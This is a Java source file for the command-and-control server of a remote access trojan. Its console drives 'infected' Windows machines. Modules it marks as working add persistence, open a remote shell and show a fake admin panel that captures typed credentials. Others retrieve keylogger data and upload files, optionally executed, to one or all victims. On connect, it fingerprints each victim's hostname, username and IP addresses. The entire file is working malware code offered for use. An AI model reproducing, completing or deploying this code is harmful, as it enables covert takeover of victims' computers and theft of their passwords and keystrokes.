import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Scanner;

public class Server implements Runnable {
    ServerSocket ss;
    Socket s;
    BufferedReader din;
    DataOutputStream dout;
    PrintStream ps;
    OutputStream os;
    ArrayList<Socket> sessions = new ArrayList<Socket>();
    ArrayList<String> hostnames = new ArrayList<String>();
    ArrayList<String> lanIPs = new ArrayList<String>();
    ArrayList<String> usernames = new ArrayList<String>();
    ArrayList<ArrayList<String>> localIPs = new ArrayList<ArrayList<String>>();
    
    public static void main(String[] args) throws Exception {
        Server serv = new Server();
        (new Thread(new SessionListener(serv))).start();
        serv.run();
    }

    public Server() {
    }

    public void run() {
        try {
            // System.out.println("connection from " + s.getInetAddress());
            String command;
            while (true) {
                System.out.print("<console> : ");
                command = Keyboard.readString();
                command = command.toLowerCase().trim();
                if (command.equals("help")) {
                    System.out.println("HELP MENU:");
                    System.out.println("\tWORKING - persist - initiate persistance on remote machine");
                    System.out.println("\tWORKING - shell - enter a stateless shell environment");
                    System.out.println("\tIN PROGRESS - keylogger - track keypresses of infected machine");
                    System.out.println("\tIN PROGRESS - upload - open prompt for uploading a file");
                    System.out.println("\tIN PROGRESS - batchupload - upload a single file to many computers");
                    System.out.println("\tIN PROGRESS - download - open prompt for downloading a remote file");
                    /// System.out.println("\tIN PROGRESS - screenshot - take a screenshot of the
                    /// remote machine");
                    // System.out.println("\tIN PROGRESS - webcam - take an image using the victims
                    /// camera");
                    // System.out.println("\tIN PROGRESS - mousebreak - prevent the victims mouse
                    /// from moving");
                    // System.out.println("\tIN PROGRESS - keybreak - create issues with the victims
                    /// keyboard");
                    System.out.println("\tWORKING - adminpanel - creates a fake windows admin panel");
                    System.out.println("\tWORKING - sessions - lists sessions");
                    System.out.println("\tWORKING - selectsession - change to a different session");
                }
                if (command.equals("persist")) {
                    try {
                        System.out.println("persistence module initiated");
                        System.out.println("\nEnter 1 to create persistence, enter 2 to remove persistence");
                        String choice = Keyboard.readString();
                        if (choice.equals("1")) {
                            ps.println("ps99");
                        } else if (choice.equals("2")) {
                            ps.println("ps-99");
                        }
                    } catch (Exception e) {
                        System.out.println("failed to add persistence");
                    }
                }
                if (command.equals("shell")) {
                    System.out.println("shell environment initiated");
                    System.out.println("type -99 to exit environemt");
                    try {
                        ps.println("sh99");
                        // din.readLine();
                        ps.println("echo %username%");
                        String uname = din.readLine();
                        din.readLine();
                        while (true) {
                            System.out.print(uname + ">");
                            String in = Keyboard.readString();
                            if (in.equals("-99")) {
                                break;
                            }
                            ps.println(in);
                            String line = din.readLine();
                            while (!line.equals("{}{}{}")) {
                                System.out.println(line);
                                line = din.readLine();
                            }
                        }
                        ps.println("sh-99");
                    } catch (Exception e) {
                        System.out.println("shell connection dropped");
                        System.out.println("session might be offline!");
                    }
                }
                if (command.equals("keylogger")) {
                    System.out.println("keylogging module initiated");
                    System.out.println("Select Option:");
                    System.out.println("0 - retrieve keylogger data");
                    System.out.println("1 - reset keylogger");
                    int choice = Keyboard.readInt();
                    if (choice == 0) {
                        ps.println("klg");
                        String confirm = din.readLine();
                        if (!confirm.equals("ok")) {
                            System.out.println("nonfatal communication sync error: more errors are likely to occur");
                        }
                        ArrayList<String> keypresses = new ArrayList<String>();
                        String line = din.readLine();
                        while (!line.equals("{}{}{}")) {
                            keypresses.add(line);
                            line = din.readLine();
                        }
                        System.out.println("keypress retrieval completed successfully");
                        boolean shift = false;
                        boolean capslock = false;
                        String output = "";
                        String[] alphabet = new String[] { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l",
                                "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3",
                                "4", "5", "6", "7", "8", "9", "0" };
                        for (String s : keypresses) {
                            if (s.indexOf("Unknown") == -1) {
                                if (s.indexOf("Shift") != -1) {
                                    if (s.substring(0, 1).equals("p")) {
                                        shift = true;
                                    } else {
                                        shift = false;
                                    }
                                }
                                if (s.indexOf("Caps") != -1) {
                                    if (s.substring(0, 1).equals("p")) {
                                        if (shift == true) {
                                            shift = false;
                                        } else {
                                            shift = true;
                                        }
                                    }
                                }
                                if (Arrays.asList(alphabet).contains(s.substring(2).toLowerCase())) {
                                    if (s.substring(0, 1).equals("p")) {
                                        String seg = s;
                                        if (shift) {
                                            seg = seg.toUpperCase();
                                        } else {
                                            seg = seg.toLowerCase();
                                        }
                                        output = output + seg.substring(2);
                                    }
                                } else {
                                    if (s.substring(0, 1).equals("p")) {
                                        output = output + "[" + s.substring(2).toUpperCase() + "]";
                                    }
                                }
                            }
                        }
                        System.out.println(output);

                    } else if (choice == 1) {
                        ps.println("klr");
                        String confirm = din.readLine();
                        if (!confirm.equals("c")) {
                            System.out.println("nonfatal communication sync error: more errors are likely to occur");
                        }
                    }
                }
                if (command.equals("upload")) {
                    try {
                        System.out.print("Execute on upload?(Y/N):");
                        String uple = Keyboard.readString();
                        String uplestr = "ul";
                        if (uple.toLowerCase().equals("y")) {
                            uplestr = "ule";
                        }
                        System.out.println("provide a file");
                        Scanner input = new Scanner(System.in);
                        ps.println(uplestr);
                        String[] locDestTmp = input.nextLine().split(" ");
                        String[] locDest = new String[2];
                        locDest[0] = locDestTmp[0];
                        File fileToUpload = new File(locDest[0]);
                        if (!fileToUpload.exists()) {
                            System.out.println("file doesn't exist");
                        } else if (locDestTmp.length < 1) {
                            System.out.println("Syntax is: [local file location] <destination file location>");
                        } else {
                            if (locDestTmp.length == 1) {
                                locDest[1] = "de " + locDest[0].substring(locDest[0].lastIndexOf("\\") + 1);
                            } else {
                                locDest[1] = locDestTmp[1];
                            }
                            System.out.println(locDest[1]);
                            ps.println(locDest[1]);
                            String ret = din.readLine();
                            if (ret.equals("fe")) {
                                System.out.println("File destination does not exist");
                            }
                            byte[] fileBytes = new byte[(int) fileToUpload.length()];
                            BufferedInputStream bin = new BufferedInputStream(new FileInputStream(fileToUpload));
                            bin.read(fileBytes);

                            System.out.println("sending file " + locDest[0] + " to " + locDest[1]);
                            os.write(fileBytes);
                            os.flush();

                            System.out.println("finished file transfer");
                        }
                    } catch (Exception e) {
                        System.out.println("failed to upload file");
                    }
                }
                if (command.equals("batchupload")) {
                    System.out.print("Execute on upload?(Y/N):");
                    String uple = Keyboard.readString();
                    String uplestr = "ul";
                    if (uple.toLowerCase().equals("y")) {
                        uplestr = "ule";
                    }
                    System.out.println("provide a file");
                    Scanner input = new Scanner(System.in);
                    String[] locDestTmp = input.nextLine().split(" ");
                    String[] locDest = new String[2];
                    locDest[0] = locDestTmp[0];
                    File fileToUpload = new File(locDest[0]);
                    if (!fileToUpload.exists()) {
                        System.out.println("file doesn't exist");
                    } else if (locDestTmp.length < 1) {
                        System.out.println("Syntax is: [local file location] <destination file location>");
                    } else {
                        for(int i=0;i<sessions.size();i++) {
                            System.out.println("Sending file to " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i));
                            s = sessions.get(i);
                            ps = new PrintStream(s.getOutputStream());
                            os = s.getOutputStream();
                            din = new BufferedReader(new InputStreamReader(s.getInputStream()));
                            ps.println("a");
                            String chk = din.readLine();
                            if (!chk.equals("a")) {
                                System.out.println("DATA COMMUNICATION ERROR - SESSION MIGHT BE OUT OF SYNC");
                                continue;
                            }
                            ps.println(uplestr);
                            if (locDestTmp.length == 1) {
                                locDest[1] = "de " + locDest[0].substring(locDest[0].lastIndexOf("\\") + 1);
                            } else {
                                locDest[1] = locDestTmp[1];
                            }
                            //System.out.println(locDest[1]);
                            ps.println(locDest[1]);
                            String ret = din.readLine();
                            if (ret.equals("fe")) {
                                System.out.println("File destination does not exist");
                            }
                            byte[] fileBytes = new byte[(int) fileToUpload.length()];
                            BufferedInputStream bin = new BufferedInputStream(new FileInputStream(fileToUpload));
                            bin.read(fileBytes);
                            System.out.println("sending file " + locDest[0] + " to " + locDest[1]);
                            os.write(fileBytes);
                            os.flush();
                            System.out.println("finished file transfer");
                            try {
                                Thread.sleep(100);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
                if (command.equals("download")) {
                    System.out.println("file download module initiated");
                    System.out.print("enter complete URI of file to download");
                    String loc = Keyboard.readString();
                    ps.println("dl");
                    String check = din.readLine();
                    if (!check.equals("ok")) {
                        System.out.println("Communication out of sync error");
                    }
                    ps.println(loc);
                    String fname = din.readLine();
                    BufferedInputStream istr = new BufferedInputStream(s.getInputStream(), 65535);

                }
                if (command.equals("screenshot")) {
                    System.out.println("screenshot module initiated");

                }
                if (command.equals("webcam")) {
                    System.out.println("webcam module initiated");

                }
                if (command.equals("mousebreak")) {
                    System.out.println("mousebreak attack initiated");

                }
                if (command.equals("keybreak")) {
                    System.out.println("keybreak attack initiated");

                }
                if (command.equals("nircmd")) {
                    System.out.println("nircmd control initiated");

                }
                if (command.equals("adminpanel")) {
                    System.out.println("starting remote admin panel");
                    ps.println("ap99");
                    System.out.println("how long would you like the panel to remain in seconds?");
                    int seconds = (int) Keyboard.readDouble();
                    ps.println(seconds);
                    // din.readLine();
                    String line = "";
                    System.out.println("WINDOW INITIATED\nLISTENING FOR CREDENTIALS...\n\n");
                    while (!line.equals("{}{}{}")) {
                        line = din.readLine();
                        if (!line.equals("{}{}{}")) {
                            System.out.println("CREDENTIALS GRABBED - " + line);
                        }
                    }
                    System.out.println();
                }
                if (command.equals("sessions")) {
                    try {
                        System.out.println("LISTING SESSIONS:\n");
                        for (int i = 0; i < sessions.size(); i++) {
                            System.out.print(i + " - " + sessions.get(i).getInetAddress() + " - " + hostnames.get(i) + " - " + lanIPs.get(i) + " - " + usernames.get(i));
                            for(String s : localIPs.get(i)) {
                                System.out.print(" - " + s);
                            }
                            System.out.println();
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        System.out.println("failed to list sessions");
                    }
                }
                if (command.equals("selectsession")) {
                    int tsesnum = 0;
                    try {
                        System.out.println("\nenter a valid session #:");
                        int sesnum = Keyboard.readInt();
                        tsesnum = sesnum;
                        s = sessions.get(sesnum);
                        ps = new PrintStream(s.getOutputStream());
                        os = s.getOutputStream();
                        din = new BufferedReader(new InputStreamReader(s.getInputStream()));
                        ps.println("a");
                        String chk = din.readLine();
                        if (!chk.equals("a")) {
                            System.out.println("DATA COMMUNICATION ERROR - SESSION MIGHT BE OUT OF SYNC");
                            break;
                        }
                        System.out.println("now connected to session " + sesnum);
                        System.out.println("connected session IP is " + s.getInetAddress());
                        System.out.println("connected session HOSTNAME is " + hostnames.get(sesnum));
                    } catch (Exception e) {
                        System.out.println("Critical error communicating with session - terminating connection");
                        sessions.remove(tsesnum);
                        hostnames.remove(tsesnum);
                        lanIPs.remove(tsesnum);
                        localIPs.remove(tsesnum);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void switchSession(int i) {
        Socket current = sessions.get(i);

    }

    public void addSocket(Socket cs) {
        try {
            PrintStream tps = new PrintStream(cs.getOutputStream());
            OutputStream tos = cs.getOutputStream();
            BufferedReader tdin = new BufferedReader(new InputStreamReader(cs.getInputStream()));
            tps.println("sh99");
            tps.println("@echo off");
            tdin.readLine();
            tps.println("FOR /F \"usebackq\" %i IN (`hostname`) DO echo %i");
            tdin.readLine();
            String hostname = tdin.readLine();
            hostname = hostname.substring(hostname.indexOf(" ") + 1);
            tps.println("echo %username%");
            tdin.readLine();
            tdin.readLine();    
            String username = tdin.readLine();
            tdin.readLine();
            tps.println("wmic NICCONFIG WHERE IPEnabled=true GET IPAddress");
            tdin.readLine();
            ArrayList<String> tempips = new ArrayList<String>();
            String tline = tdin.readLine();
            while(!tline.equals("{}{}{}")) {
                if (tline.trim().length()>0) {
                    tempips.add(tline.trim().substring(tline.indexOf("\"")+1,tline.indexOf(",")-1));
                }
                tline = tdin.readLine();
            }
            String lanIP = cs.getLocalAddress().toString();
            boolean notconnectedyet = true;
            if (usernames.contains(username) && hostnames.contains(hostname) && lanIPs.contains(lanIP)) {
                for(ArrayList<String> sarr : localIPs) {
                    if (sarr.size()==tempips.size()) {
                        for(int i=0;i<sarr.size();i++) {
                            if (!tempips.get(i).equals(sarr.get(i))) {
                                break;
                            }
                            if (i==sarr.size()-1) {
                                notconnectedyet=false;
                            }
                        }
                    }
                }
            }
            if (notconnectedyet) {
                localIPs.add(tempips);
                usernames.add(username);
                lanIPs.add(lanIP);
                hostnames.add(hostname);
                sessions.add(cs);
                System.out.print("\nNEW SESSION CONNECTED: IP-" + cs.getInetAddress() + " - " + hostname + " - " + lanIP + " - " + username);
                for(String s : tempips) {
                    System.out.print(" - " + s);
                }
                System.out.println("\n");
                System.out.print("<console> : ");
                tps.println("sh-99");
            } else {
                tps.println("sh-99");
                tps.println("q");
            }
        } catch (Exception e) {
            e.printStackTrace();
            System.out.println("failed to add new socket");
        }
    }
}